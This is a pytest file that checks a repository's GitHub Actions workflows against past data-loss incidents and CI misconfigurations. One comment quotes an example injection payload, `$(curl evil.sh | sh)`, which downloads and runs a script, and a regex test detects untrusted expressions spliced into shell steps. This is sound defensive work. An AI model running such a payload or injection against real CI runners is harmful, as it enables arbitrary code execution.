# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Mark Rusch
"""The GitHub workflows are checked like any other code that can lose a day's prices.

Nothing in `.github/workflows/` was under test. It is YAML wrapping shell, it runs
unattended at 11:00 UTC, it holds the only copy of the day's collection until it commits,
and every one of this repo's data-loss incidents happened inside it:

- `git pull --rebase` refuses to run with staged changes, so every computed print from
  2026-07-22 onward was silently discarded before it was ever committed;
- the commit step was skipped whenever an earlier step failed, so four sessions of
  collection were thrown away with the runner.

Both were fixed in the YAML and neither fix had anything stopping it being undone. These
tests are that. They assert the properties whose absence caused the incidents, not the
exact wording of the steps, so the file can be rewritten freely as long as it still keeps
the data.
"""

from __future__ import annotations

import re
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest
import yaml

WORKFLOWS = Path(__file__).resolve().parents[1] / ".github" / "workflows"


def _load(name: str) -> dict[str, Any]:
    return yaml.safe_load((WORKFLOWS / name).read_text(encoding="utf-8"))


def _steps(wf: dict[str, Any], job: str) -> list[dict[str, Any]]:
    return wf["jobs"][job]["steps"]


def _all_workflows() -> list[Path]:
    return sorted(WORKFLOWS.glob("*.yml")) + sorted(WORKFLOWS.glob("*.yaml"))


@pytest.mark.parametrize("path", _all_workflows(), ids=lambda p: p.name)
def test_every_workflow_is_valid_yaml_with_jobs(path: Path) -> None:
    """A workflow that does not parse does not run, and GitHub says so only in the UI."""
    wf = yaml.safe_load(path.read_text(encoding="utf-8"))
    assert isinstance(wf, dict), f"{path.name} is not a mapping"
    assert wf.get("jobs"), f"{path.name} defines no jobs"
    for name, job in wf["jobs"].items():
        assert job.get("runs-on"), f"{path.name}:{name} has no runner"
        for step in job.get("steps", []):
            assert "uses" in step or "run" in step, f"{path.name}:{name} has an empty step"


def test_the_daily_commit_step_runs_even_when_the_run_failed() -> None:
    """Four sessions of collection were lost to this exact condition being absent.

    Observations are live prices. A past date cannot honestly be re-collected, so the
    rows exist only on the runner until they are committed. Whatever else failed, the
    data has to be saved.
    """
    steps = _steps(_load("daily.yml"), "daily")
    commit = [s for s in steps if "git add" in str(s.get("run", ""))]
    assert commit, "the daily workflow no longer commits anything"
    condition = str(commit[0].get("if", "")).replace(" ", "")
    assert "failure()" in condition, (
        "the commit step must run after a failed run, or the day's collection is thrown "
        "away with the runner"
    )


def test_the_daily_run_never_force_pushes() -> None:
    """`data/eucri.db` is the published record; a force-push here destroys real history."""
    text = (WORKFLOWS / "daily.yml").read_text(encoding="utf-8")
    for bad in ("push --force", "push -f ", "--force-with-lease"):
        assert bad not in text, f"daily.yml force-pushes ({bad!r})"


def test_the_daily_run_cannot_race_itself() -> None:
    """Two runs committing the same database is a corrupted record, not a merge."""
    wf = _load("daily.yml")
    assert wf.get("concurrency"), "daily.yml has no concurrency group"
    assert wf["concurrency"].get("cancel-in-progress") is False, (
        "cancelling a run in progress can kill it between collection and commit"
    )


def test_the_daily_schedule_is_the_published_one() -> None:
    """The methodology and the site both state 11:00 UTC. Moving it is a governed change."""
    wf = _load("daily.yml")
    # `on` is YAML 1.1's boolean true, the same trap that dropped Norway from the EEA set.
    triggers = wf.get("on", wf.get(True))
    crons = [s["cron"] for s in triggers["schedule"]]
    assert crons == ["0 11 * * *"], f"the daily schedule moved: {crons}"


def test_every_job_runs_the_same_python() -> None:
    """CI green and daily broken is what version drift between these two files looks like."""
    versions = set()
    for path in _all_workflows():
        wf = yaml.safe_load(path.read_text(encoding="utf-8"))
        for job in wf["jobs"].values():
            for step in job.get("steps", []):
                if str(step.get("uses", "")).startswith("actions/setup-python"):
                    versions.add(str(step["with"]["python-version"]))
    assert len(versions) == 1, f"workflows disagree on the Python version: {sorted(versions)}"


def test_the_daily_run_installs_what_the_tests_install_minus_dev() -> None:
    """`pip install -e .` in daily, `.[dev]` in test: a runtime dependency parked in the
    dev extra passes CI and crashes the 11:00 run. Nothing checks that except this."""
    steps = _steps(_load("daily.yml"), "daily")
    daily = [s for s in steps if "pip install" in str(s.get("run", ""))]
    assert daily, "the daily workflow installs nothing"
    assert "[dev]" not in daily[0]["run"], (
        "the daily run must install the package as a user gets it, so a runtime "
        "dependency in the dev extra fails here rather than in production"
    )


def test_the_test_workflow_runs_the_whole_check_set() -> None:
    """The four commands the roadmap's acceptance lines name."""
    runs = " ".join(str(s.get("run", "")) for s in _steps(_load("test.yml"), "test"))
    for command in ("ruff check", "mypy", "pytest"):
        assert command in runs, f"CI no longer runs {command}"


def test_the_canary_is_not_on_a_schedule() -> None:
    """SOURCES.md commits TCI publicly to one request per source per day.

    A canary beside the daily job would quietly make that two, against sources that have
    given no permission for it. It runs on proposed changes to collectors and on request.
    """
    wf = _load("canary.yml")
    triggers = wf.get("on", wf.get(True))
    assert "schedule" not in triggers, (
        "a scheduled canary doubles TCI's request rate against every source it names"
    )
    assert "workflow_dispatch" in triggers


def _run_blocks(path: Path) -> list[tuple[str, str]]:
    wf = yaml.safe_load(path.read_text(encoding="utf-8"))
    out = []
    for job_name, job in wf["jobs"].items():
        for i, step in enumerate(job.get("steps", [])):
            if "run" in step:
                out.append((f"{path.name}:{job_name}:{i} {step.get('name', '')}", step["run"]))
    return out


# Contexts a workflow does not control the content of. `github.event.*` and `inputs.*`
# (workflow_dispatch) can carry attacker-chosen text such as `$(curl evil.sh | sh)`;
# splicing either straight into a `run:` block is shell injection on the runner, and
# actionlint's own shellcheck pass does not catch it (it replaces `${{ }}` with a
# placeholder before handing the script to shellcheck, same as `_run_blocks` below).
_UNTRUSTED_EXPRESSION = re.compile(r"\$\{\{\s*(github\.event\.|inputs\.)")


@pytest.mark.parametrize("path", _all_workflows(), ids=lambda p: p.name)
def test_no_run_block_interpolates_an_untrusted_expression(path: Path) -> None:
    """User-controlled input must reach a `run:` block through `env:`, never inline.

    `env: {X: ${{ inputs.foo }}}` then `$X` in the script is safe: the shell sees an
    environment variable, not attacker-controlled syntax. `ARGS="--source ${{ inputs.foo
    }}"` is not: GitHub substitutes the raw string before bash ever parses it.
    """
    for label, script in _run_blocks(path):
        assert not _UNTRUSTED_EXPRESSION.search(script), (
            f"{label} interpolates an untrusted expression directly into shell -- pass "
            "it through env: instead"
        )


@pytest.mark.parametrize("path", _all_workflows(), ids=lambda p: p.name)
def test_the_shell_in_every_run_block_parses(path: Path) -> None:
    """`bash -n` over each `run:` block.

    actionlint does this and more in CI, in a container. This runs anywhere, needs
    nothing installed, and catches the failure that matters most here: the daily job is
    the only copy of a day's collection until it commits, and a shell syntax error in it
    is discovered at 11:00 UTC by losing the day.

    GitHub expressions are substituted before the shell ever sees them, so they are
    replaced with a placeholder rather than fed to bash as `${{ ... }}`.
    """
    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("no bash on this machine; actionlint covers this in CI")
    for label, script in _run_blocks(path):
        cleaned = re.sub(r"\$\{\{[^}]*\}\}", "PLACEHOLDER", script)
        proc = subprocess.run([bash, "-n"], input=cleaned, capture_output=True, text=True)
        assert proc.returncode == 0, f"{label} is not valid shell:\n{proc.stderr}"


def test_the_intraday_job_commits_its_reads_and_nothing_of_the_fixing() -> None:
    """The hourly job appends to data/intraday/ and rebuilds one page. It must keep an
    hour's reads when a step fails, and must never be the job that commits the record the
    prints live in: two writers to data/eucri.db is a lost day waiting to happen."""
    text = (WORKFLOWS / "intraday.yml").read_text(encoding="utf-8")
    steps = _steps(_load("intraday.yml"), "sweep")
    commit = [s for s in steps if "git add" in str(s.get("run", ""))]
    assert commit, "the intraday workflow no longer commits anything"
    assert "failure()" in str(commit[0].get("if", "")).replace(" ", "")
    add_lines = [ln for ln in commit[0]["run"].splitlines() if "git add" in ln]
    for ln in add_lines:
        assert "eucri.db" not in ln and " site/ " not in f"{ln} ", ln
        assert "data/intraday" in ln
    for bad in ("push --force", "push -f ", "--force-with-lease", "tci.run daily"):
        assert bad not in text, f"intraday.yml must not use {bad!r}"


def test_the_intraday_job_cannot_race_itself_or_sit_on_the_fixing() -> None:
    wf = _load("intraday.yml")
    assert wf["concurrency"].get("cancel-in-progress") is False
    triggers = wf.get("on", wf.get(True))
    for s in triggers["schedule"]:
        minute = s["cron"].split()[0]
        assert minute != "0", "the top of the hour is when scheduled runs are dropped"


def test_a_hung_or_failed_sweep_still_publishes_and_commits() -> None:
    """The sweep step has its own time limit, below the job's: a step that times out only
    fails, and every later step runs on failure. A job that times out is cancelled and runs
    nothing more, which would throw the hour's reads away with the runner."""
    wf = _load("intraday.yml")
    job = wf["jobs"]["sweep"]
    steps = job["steps"]
    sweep = next(s for s in steps if "intraday sweep" in str(s.get("run", "")))
    assert 0 < sweep["timeout-minutes"] < job["timeout-minutes"]
    after = steps[steps.index(sweep) + 1:]
    assert after, "nothing runs after the sweep"
    for s in after:
        cond = str(s.get("if", "")).replace(" ", "")
        assert "failure()" in cond or "always()" in cond, (
            f"step {s.get('name')!r} is skipped when the sweep fails")
